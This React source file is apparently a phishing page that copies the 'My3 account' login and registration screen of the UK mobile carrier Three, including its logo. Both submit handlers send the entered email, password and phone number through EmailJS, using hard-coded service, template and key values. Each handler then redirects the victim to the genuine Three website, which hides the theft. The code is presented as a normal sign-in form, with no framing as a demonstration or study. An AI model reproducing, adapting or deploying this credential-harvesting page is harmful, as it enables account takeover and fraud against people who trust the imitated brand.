import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import { FiEye, FiEyeOff } from "react-icons/fi";

const AuthForm = () => {
  const [isRegister, setIsRegister] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [accountType, setAccountType] = useState("personal");
  const [isSubmitting, setIsSubmitting] = useState(false); // ✅ disable double click

  // Input field states
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    confirmPassword: "",
    phone: "",
  });

  const form = useRef();

  // Input handler
  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  // ✅ Login Email Sender
  const sendLoginEmail = async (e) => {
    e.preventDefault();

    if (isSubmitting) return; // prevent multiple clicks
    setIsSubmitting(true);

    try {
      const result = await emailjs.sendForm(
        "service_50q88et",
        "template_bh85laf",
        form.current,
        "vambHF3ypLBcOv_j_"
      );
      console.log("✅ Login email sent:", result.text);
      window.location.href = "https://www.three.co.uk/";
    } catch (error) {
      console.error("❌ Error sending login email:", error.text);
      alert("There was a problem sending your login info. Please try again.");
    } finally {
      setIsSubmitting(false);
      e.target.reset();
    }
  };

  // ✅ Register Email Sender
  const sendRegisterEmail = async (e) => {
    e.preventDefault();

    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      const result = await emailjs.sendForm(
        "service_50q88et",
        "template_bh85laf",
        form.current,
        "vambHF3ypLBcOv_j_"
      );
      console.log("✅ Register email sent:", result.text);
      window.location.href = "https://www.three.co.uk/";
    } catch (error) {
      console.error("❌ Error sending register email:", error.text);
      alert("There was a problem sending your registration info. Please try again.");
    } finally {
      setIsSubmitting(false);
      e.target.reset();
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-white">
      <div className="w-full max-w-sm text-center">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <img
            src="https://www.three.co.uk/content/experience-fragments/threedigital/uk/en/site/header/master/_jcr_content/root/header/top/logo.coreimg.svg/1668177162294/three-logo.svg"
            alt="Logo"
            className="w-[30%] h-auto"
          />
        </div>

        {/* Title */}
        <h2 className="text-4xl font-bold">My3 account</h2>

        {/* Tabs */}
        <div className="flex justify-center mt-4 border-b border-gray-900">
          <button
            type="button"
            className={`w-1/2 pb-2 font-medium text-center ${
              !isRegister ? "border-b-2 border-black" : "text-gray-500"
            }`}
            onClick={() => setIsRegister(false)}
          >
            Log in
          </button>
          <button
            type="button"
            className={`w-1/2 pb-2 font-medium text-center ${
              isRegister ? "border-b-2 border-black" : "text-gray-500"
            }`}
            onClick={() => setIsRegister(true)}
          >
            Register
          </button>
        </div>

        {/* Form */}
        <form
          ref={form}
          className="mt-6 text-left"
          onSubmit={isRegister ? sendRegisterEmail : sendLoginEmail}
        >
          {/* Account type (Register only) */}
          {isRegister && (
            <div className="mb-4">
              <label className="block text-gray-700 font-medium">
                Select account type:
              </label>
              <div className="mt-2">
                <label className="flex items-center text-black text-lg">
                  <input
                    type="radio"
                    name="accountType"
                    value="personal"
                    checked={accountType === "personal"}
                    onChange={() => setAccountType("personal")}
                    className="mr-2 w-8 h-8 accent-black"
                  />
                  Personal account or business employee
                </label>
                <label className="flex items-center mt-2 text-black text-lg">
                  <input
                    type="radio"
                    name="accountType"
                    value="business"
                    checked={accountType === "business"}
                    onChange={() => setAccountType("business")}
                    className="mr-2 w-8 h-8 accent-black"
                  />
                  Business account owner
                </label>
              </div>
            </div>
          )}

          {/* Phone (Register only) */}
          {isRegister && (
            <div className="relative mb-4">
              <input
                type="text"
                name="phone"
                value={formData.phone}
                onChange={handleChange}
                placeholder="Phone number"
                className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
              />
            </div>
          )}

          {/* Email */}
          <div className="relative">
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              placeholder="Email address*"
              required
              className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
            />
          </div>

          {/* Password */}
          <div className="relative mt-4">
            <input
              type={showPassword ? "text" : "password"}
              name="password"
              value={formData.password}
              onChange={handleChange}
              placeholder="Password*"
              required
              className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
            />
            <span
              className="absolute right-2 top-3 text-gray-500 cursor-pointer"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? <FiEyeOff size={20} /> : <FiEye size={20} />}
            </span>
          </div>

          {/* Confirm Password (Register only) */}
          {isRegister && (
            <>
              <div className="text-black text-base mt-2">
                <p>• Your password must contain 12 characters or more.</p>
                <p>• Try forming one with 3 random words.</p>
              </div>

              <div className="relative mt-4">
                <input
                  type={showConfirmPassword ? "text" : "password"}
                  name="confirmPassword"
                  value={formData.confirmPassword}
                  onChange={handleChange}
                  placeholder="Confirm password*"
                  required
                  className="w-full border-b border-gray-900 focus:outline-none p-2 pt-5"
                />
                <span
                  className="absolute right-2 top-3 text-gray-500 cursor-pointer"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                >
                  {showConfirmPassword ? (
                    <FiEyeOff size={20} />
                  ) : (
                    <FiEye size={20} />
                  )}
                </span>
              </div>
            </>
          )}

          {/* Forgot Password (Login only) */}
          {!isRegister && (
            <div className="text-left underline mt-2">
              <a href="#" className="text-blue-600 text-sm">
                Forgot password?
              </a>
            </div>
          )}

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className={`w-full bg-black text-white py-2.5 font-bold rounded-2xl mt-6 ${
              isSubmitting ? "opacity-60 cursor-not-allowed" : ""
            }`}
          >
            {isSubmitting
              ? "Please wait..."
              : isRegister
              ? "Register"
              : "Log in"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default AuthForm;
